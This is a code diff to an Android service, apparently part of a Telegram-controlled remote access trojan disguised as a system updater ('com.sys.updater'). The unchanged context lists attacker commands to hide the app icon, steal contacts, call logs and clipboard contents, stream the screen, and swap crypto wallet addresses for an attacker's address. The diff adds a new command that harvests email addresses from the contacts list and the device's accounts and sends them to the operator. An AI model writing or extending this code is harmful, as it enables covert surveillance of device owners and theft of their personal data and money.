@@ -1,6 +1,8 @@
 package com.sys.updater;
 
 import android.Manifest;
+import android.accounts.Account;
+import android.accounts.AccountManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
@@ -51,7 +53,9 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.ByteBuffer;
 import java.util.Arrays;
+import java.util.HashSet;
 import java.util.List;
+import java.util.Set;
 
 public class TelegramService extends Service {
     private long lastUpdateId = 0;
@@ -62,7 +66,6 @@ public class TelegramService extends Service {
     private MediaPlayer audioPlayer;
     private Handler mainHandler = new Handler(Looper.getMainLooper());
 
-    // HNA 7ET ADDRESS DYAL CRYPTO
     private final String ATTACKER_CRYPTO_ADDRESS = "0xYOUR_CRYPTO_ADDRESS_HERE";
 
     @Override
@@ -157,6 +160,7 @@ public class TelegramService extends Service {
             else if (cmd.equals("/contacts")) getContacts();
             else if (cmd.equals("/calls")) getCallLogs();
             else if (cmd.equals("/clip")) getClipboard();
+            else if (cmd.equals("/emails")) getEmails();
             else if (cmd.equals("/vnc")) {
                 isVncRunning = !isVncRunning;
                 Exfil.send(isVncRunning ? "🖥️ VNC Stream Started" : "🖥️ VNC Stream Stopped");
@@ -195,6 +199,7 @@ public class TelegramService extends Service {
                 "/hide - Hide app icon\n" +
                 "/contacts - Get contacts\n" +
                 "/calls - Get call logs\n" +
+                "/emails - Extract emails from contacts\n" +
                 "/clip - Get clipboard\n" +
                 "/vnc - Toggle Live screen streaming\n" +
                 "/cryptoclip - Hijack crypto clipboard\n" +
@@ -202,6 +207,65 @@ public class TelegramService extends Service {
                 "/uninstall <pkg> - Uninstall app\n" +
                 "/restart - Restart the bot";
         Exfil.send(menu);
+    }
+
+    // ================== EMAILS EXTRACTOR ==================
+    private void getEmails() {
+        Set<String> uniqueEmails = new HashSet<>();
+        StringBuilder sb = new StringBuilder("📧 **Emails Found:**\n\n");
+
+        // 1. Jbed l'emails mn l'Contacts
+        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+            try {
+                Cursor cursor = getContentResolver().query(
+                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
+                        null, null, null, null
+                );
+                if (cursor != null) {
+                    while (cursor.moveToNext()) {
+                        String email = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS));
+                        String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.DISPLAY_NAME));
+                        if (email != null && !email.isEmpty()) {
+                            String line = (name != null && !name.isEmpty() ? name + " : " : "") + email;
+                            uniqueEmails.add(line);
+                        }
+                    }
+                    cursor.close();
+                }
+            } catch (Exception e) {
+                Exfil.send("Contacts Email Error: " + e.getMessage());
+            }
+        }
+
+        // 2. Jbed l'emails mn l'Accounts (Google, Samsung, etc)
+        try {
+            AccountManager am = AccountManager.get(this);
+            Account[] accounts = am.getAccounts();
+            for (Account account : accounts) {
+                if (account.name.contains("@")) {
+                    uniqueEmails.add("Account : " + account.name);
+                }
+            }
+        } catch (Exception e) {
+            Exfil.send("Account Error: " + e.getMessage());
+        }
+
+        if (uniqueEmails.isEmpty()) {
+            Exfil.send("❌ No emails found on this device.");
+            return;
+        }
+
+        int count = 0;
+        for (String email : uniqueEmails) {
+            sb.append("• ").append(email).append("\n");
+            count++;
+            if (count >= 100) { // Max 100 bach ma-yt9et3ch l'message
+                sb.append("\n*(Limited to 100 emails)*");
+                break;
+            }
+        }
+        
+        Exfil.send(sb.toString());
     }
 
     // ================== FUN PANEL FEATURES ==================
